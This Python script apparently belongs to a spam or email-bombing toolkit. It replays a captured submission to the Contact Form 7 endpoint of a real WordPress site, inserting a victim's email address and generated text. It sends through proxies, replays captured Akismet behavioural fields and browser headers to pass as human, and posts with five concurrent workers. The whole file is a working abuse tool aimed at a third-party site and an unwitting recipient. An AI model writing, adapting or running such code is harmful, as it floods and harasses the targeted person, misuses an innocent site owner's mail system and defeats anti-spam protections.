from os.path import basename

import requests

from module import Spam

cookies = {
    '_ga': 'GA1.2.1541489818.1676889627',
    '_gid': 'GA1.2.1307617193.1676889627',
    '_gat_gtag_UA_174154424_1': '1',
}

headers = {
    'authority': 'kobe-ippinya.net',
    'accept': 'application/json, */*;q=0.1',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary0nRD7hsqAFMM55Rc',
    # 'cookie': '_ga=GA1.2.1541489818.1676889627; _gid=GA1.2.1307617193.1676889627; _gat_gtag_UA_174154424_1=1',
    'origin': 'https://kobe-ippinya.net',
    'referer': 'https://kobe-ippinya.net/contact/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n14\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.6.3\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nja\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f14-p12-o1\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n12\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\n\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="your-name"\r\n\r\nname\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="your-email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="tel"\r\n\r\n123123123\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="your-message"\r\n\r\ntest\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="_wpcf7_ak_hp_textarea"\r\n\r\n\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="_wpcf7_ak_js"\r\n\r\n1676889784278\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="ak_bib"\r\n\r\n1676889785671\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="ak_bfs"\r\n\r\n1676889795108\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="ak_bkpc"\r\n\r\n22\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="ak_bkp"\r\n\r\n168;168,136;112,32;96,72;95,118;102,65;136;103,41;136,71;104,16;128,8;151,89;152,104;120,16;80,152;96,56;312;88;88,56;56,64;88,40;1;\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="ak_bmc"\r\n\r\n50;79,1486;80,928;47,841;80,585;87,216;95,2193;71,929;91,1784;\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="ak_bmcc"\r\n\r\n9\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="ak_bmk"\r\n\r\n\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="ak_bck"\r\n\r\n\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="ak_bmmc"\r\n\r\n5\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="ak_btmc"\r\n\r\n0\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="ak_bsc"\r\n\r\n3\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="ak_bte"\r\n\r\n\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="ak_btec"\r\n\r\n0\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc\r\nContent-Disposition: form-data; name="ak_bmm"\r\n\r\n3083,142;1491,48;201,52;400,476;134,290;\r\n------WebKitFormBoundary0nRD7hsqAFMM55Rc--\r\n'

        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text()).encode()

        response = requests.post(
            'https://kobe-ippinya.net/wp-json/contact-form-7/v1/contact-forms/14/feedback',
            cookies=cookies,
            headers=headers,
            data=data, proxies=self.get_proxies()
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), 'mail_sent')
    res = spam.send_post()
    if res:
        spam.run_concurrently(5)


if __name__ == '__main__':
    main()
